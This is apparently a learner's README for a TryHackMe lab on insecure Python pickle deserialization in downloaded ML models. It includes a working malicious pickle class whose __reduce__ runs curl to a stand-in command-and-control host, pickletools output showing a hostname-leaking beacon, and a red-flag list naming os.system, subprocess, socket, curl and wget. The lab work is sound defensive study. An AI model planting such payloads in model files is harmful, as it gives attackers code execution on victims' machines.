# Insecure Deserialization as a Supply Chain Attack Vector

> Practical exploration of insecure Python deserialization using
> `pickle` 
> - as a supply chain attack vector in the serilisation process

## Source Lab

This project is based on the
[TryHackMe Supply Chain Attack Vector] room.

The purpose of this repository is to document my learning process,
analysis, commands, observations, and mitigation strategies while
working through the lab.

---

## Objectives

- Understand serialization and deserialization
- Understand how Python `pickle` works
- Identify insecure deserialization
- Analyze a malicious serialized object
- Understand how `__reduce__()` can influence deserialization
- Understand the security impact
- Explore safer alternatives and mitigations
- Compearing model cards to identify the malicous and bieng models before download for use.  

---

## Environment

- OS: Kali Linux
- Python: 3.x
- TryHackMe: Insecure Deserialization
- Tools: Python, Pickletools(safe), Linux terminal

---

## 01 — Understanding Serialization

### What is Serilisation ?

Think of serialisation like packing a suitcase. You have a complex Python object in memory: a trained model with millions of parameters and configuration settings. **Serialisation** converts that into a file on disk. **Deserialisation** is the reverse: unpacking the file back into a usable Python object.

Machine learning frameworks like PyTorch and scikit-learn use serialisation to save trained models so they can be loaded later without retraining.

Here is a simple example of saving and loading a model with pickle:

    import pickle
    # Serialise (save) a model to a file
    model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
    with open("model.pkl", "wb") as f:
        pickle.dump(model, f)

    # Deserialise (load) the model back
    with open("model.pkl", "rb") as f:
        loaded_model = pickle.load(f)
        

This looks harmless. The problem is in how pickle handles custom objects.

#### The __reduce__ Method

When pickle saves a custom Python object, it calls a special method called __reduce__. This method returns instructions for reconstructing the object later. Python follows those instructions automatically when you callpickle.load(), with no prompts and no warnings.

Here is the problem: __reduce__ can tell Python to call any function with any arguments. Pickle does not check or restrict what gets called. An attacker can craft an object where those reconstruction instructions are actually a system command, and Python will run it silently when the file is loaded.

### A Malicious Example

This file looks like a model. When loaded, it silently makes an outbound network connection to the attacker's server:

    import pickle
    import os

    class MaliciousModel:
        def __reduce__(self):
            # pickle.load() will call os.system() with this command
            return (os.system, ("curl http://c2.example.com/beacon",))

    with open("backdoored_model.pkl", "wb") as f:
        pickle.dump(MaliciousModel(), f)

The victim calls pickle.load() expecting model weights. Python calls os.system() instead, running curl to ping the attacker's server in the background. The same happens with torch.load() since PyTorch uses pickle internally.

**A useful analogy** would be to imagine you receive a Word document. You expect text. Instead, it silently installs malware. A malicious pickle file does exactly the same thing: it disguises executable code as data.


### What Attackers Can Do

The payload is not limited to a single action or ping. Depending on the server environment, an attacker can execute these payloads:

| Payload       | Impact |
| :---          |    :----:   |
| Reverse shell | Full Remote Access to victims machine     |
| Data exfilteration    | Steal sensitive files such as credentials or source code |
| Crypto miner | Uses the victim's computer resources to mine cryptocurrency   |
| Reconnaissance | Maps usernames, hostnames, and running processes |

| Data exfilteration    | Steal sensitive files such as credentials or source code |
| Crypto miner | Uses the victim's computer resources to mine cryptocurrency   |
| Reconnaissance | Maps usernames, hostnames, and running processes |

---

## 02 - Investigating a Malicious Model 

Now it's time to apply the above to a lab. TryTrainMe's AI-powered code reviewer uses a model called code_reviewer.pkl. The CEO's email claims this model is compromised. **Your job: investigate it safely.**

> Credentials 
> only needed if you're using your own machine.
> Username - analyst, Password - analyst123, IP address - MACHINE_IP, Connection via SSH - ssh analyst@MACHINE_IP

#### Lab Directory Structure

    analyst@tryhackme-2204:~$ ls -la /opt/supply-chain total 32
    drwxr-xr-x 8 analyst analyst 4096 Mar  3 02:57 .
    drwxr-xr-x 3 root    root    4096 Mar  3 02:57 ..
    drwxr-xr-x 5 analyst analyst 4096 Mar  3 02:57 
    auditdrwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 
    dependenciesdrwxr-xr-x 6 analyst analyst 4096 Mar  3 02:57 
    incidentdrwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 
    modelsdrwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 
    projectdrwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 tools
        
#### Step 1: Examine File Properties

Start by checking the basic properties of the model files:

    analyst@tryhackme-2204:~$ ls -lh /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl

**Expected Output:**

    -rwxr-xr-x 1 analyst analyst 8.1M Mar  3 02:57 /opt/supply-chain/models/code_reviewer.pkl
    -rwxr-xr-x 1 analyst analyst 2.0M Mar  3 02:57 /opt/supply-chain/models/code_reviewer_v1.pkl
    
The suspicious model is four times larger than the clean model. This size difference alone does not prove malice, but it is worth noting.

**Check the file types: 

    analyst@tryhackme-2204:~$ file /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl

**Expected Output**

    /opt/supply-chain/models/code_reviewer.pkl:    data
    /opt/supply-chain/models/code_reviewer_v1.pkl: data

Both show as generic "data". The file command cannot distinguish a malicious pickle from a clean one. We need a deeper inspection.


#### Step 2: Inspect With pickletools (Safe)

Python includes a built-in module called **pickletools** that disassembles pickle files without executing them. This is the safe way to inspect pickle contents.

Keep in mind: Never use **pickle.load()** on untrusted files. It will execute any embedded code immediately.


Run pickletools on the suspecious model 

    analyst@tryhackme-2204:~$ python3 -m pickletools /opt/supply-chain/models/code_reviewer.pkl 2>&1 | head -30      


**Expected output**


    0: \x80 PROTO      4    
    2: \x95 FRAME      72   
    11: \x8c SHORT_BINUNICODE 'os'   
    15: \x94 MEMOIZE    (as 0)   
    16: \x8c SHORT_BINUNICODE 'system'   
    24: \x94 MEMOIZE    (as 1)   
    25: \x93 STACK_GLOBAL   
    26: \x94 MEMOIZE    (as 2)   
    27: \x8c SHORT_BINUNICODE 'curl http://[REDACTED]/beacon?host=$(hostname)'   
    77: \x94 MEMOIZE    (as 3)   
    78: \x85 TUPLE1   
    79: \x94 MEMOIZE    (as 4)   
    80: R    REDUCE   
    81: \x94 MEMOIZE    (as 5)   
    82: .    STOP    

#### Step 3: Identify the Red Flags 



|Line    | Pattern       | Why It Is Suspicious |
|:---    | :---          |    :----:   |
|11 | `SHORT_BINUNICODE 'os'`  | The os module provides access to operating system functions, not needed for ML inference  |
|16 | `SHORT_BINUNICODE 'system'`  | 	os.system executes shell commands   |
|25 | `STACK_GLOBAL`   | Pickle opcode that resolves and calls a Python function   |
|27 | `'curl http://[REDACTED]/...'` | Outbound HTTP request to an external domain |
|81 | `Reduce` |  Pickle opcode that executes the function with the provided arguments |

**Red flags checklist for any pickle file:**

|Pattern    | Concern Level       | Legitimate Use? |
|:---    | :---          |    :----:   |
|`os` | Critical  | Almost never in a model file  |
|`system`, `open`   |   Never   |
| `subprocess`  |   Critical    |   Never   |   
| `socket`  |   Critical    |   Never   |
| `eval`, `exec`    |   Critical    |   Never   |
| `curl`, `wget`    |   Critical    |   Never   |
| `STACK_GLOBAL`    |   Moderate    |   Common in legitimate pickles, too; check what it resolves   |
| `REDUCE`  |   Moderate    |   Common in legitimate pickles; check context |

#### Step 4: Compare With the Clean Model

Run the same analysis on the bengin model:

    analyst@tryhackme-2204:~$ python3 -m pickletools /opt/supply-chain/models/code_reviewer_v1.pkl 2>&1 | head -30        

**Expected Output**

    0: \x80 PROTO      4    
    2: \x95 FRAME      65542   
    11: \x8c SHORT_BINUNICODE '__main__'   
    21: \x94 MEMOIZE    (as 0)   
    22: \x8c SHORT_BINUNICODE '_Room2_BenignModel'   
    42: \x94 MEMOIZE    (as 1)   43: \x93 STACK_GLOBAL   
    44: \x94 MEMOIZE    (as 2)   45: )    EMPTY_TUPLE   
    46: \x81 NEWOBJ   47: \x94 MEMOIZE    (as 3)   
    48: }    EMPTY_DICT   49: \x94 MEMOIZE    (as 4)   
    50: (    MARK   
    51: \x8c     SHORT_BINUNICODE 'weights'   
    60: \x94     MEMOIZE    (as 5)   
    61: ]        EMPTY_LIST   ...

Notice the difference: although both files use `STACK_GLOBAL`, the clean model references `__main__._Room2_BenignModel` (a standard class reconstruction) rather than os.system. The rest are data types: dictionaries, lists, and floating-point numbers. There are no references to `os`, `system`, or any external URLs.


#### Step 5: Use the Safe Analysis Script


The lab includes a helper script that provides a structured summary:

    analyst@tryhackme-2204:~$ python3 /opt/supply-chain/tools/safe_analysis.py /opt/supply-chain/models/code_reviewer.pkl

**Expected output:**

    === Pickle Safety Analysis ===
    File: /opt/supply-chain/models/code_reviewer.pkl
    Size: 8.4 MB

    Dangerous opcodes found:
        [CRITICAL] STACK_GLOBAL: os.system
        [CRITICAL] REDUCE: executes os.system with arguments

    Suspicious strings:
        [CRITICAL] 'curl http://[REDACTED]/beacon?host=$(hostname)'

    Verdict: UNSAFE - Contains executable code targeting os.system


#### Step 6: Reconstruct the Attack Flow

Based on your investigation, here is what happened at TryTrainMe:


|Steps    | Action       | Actor    |
|:---    | :---          |    :----:   |
|1 | Created a malicious model with a `reduce` payload calling `os.system`  | Attacker  |
|2 | Uploaded the model to Hugging Face as "trustworthy-ai-lab/code-review-bert-v2" |   Attacker    |
|3 | TryTrainMe's ML engineer searched for a code review model on Hugging Face   | ML Engineer  |
|4 | Downloaded code_reviewer.pkl based on the professional-looking model card  | ML Engineer   |
|5 | Called `torch.load('code_reviewer.pkl')` to integrate the model  |   ML Engineer |
|6 | `reduce` payload executed:curl `http://[REDACTED]/beacon?host=$(hostname)` |   Automatic   |
|7 | Attacker received the beacon and established persistent access |   Attacker |

The entire compromise, from model download to attacker access, happened in **seconds**. The ML engineer believed they were simply loading a model.

screenshots/
├── 01-thm-room.png
├── 02-environment.png
├── 03-file-analysis.png
├── 04-pickle-structure.png
└── 05-expected-result.png

## Reproduce the Lab

### Prerequisites

- TryHackMe account
- Kali Linux or another Linux environment
- Python 3
- Git

### Setup


    git clone https://github.com/Treasure-Carl/Supply-Chain-Attack-Vector-.git
cd thm-insecure-deserialization

### Malicious Model

The lab supplied a deliberately crafted pickle model demonstrating
insecure deserialization.

I did not execute the file on the host system.

Analysis:
- File type: Python pickle
- Purpose: Demonstrate unsafe object deserialization as a Supply Chain Attack Vrctor
- Attack mechanism: __reduce__()
- Relevant function: os.system()
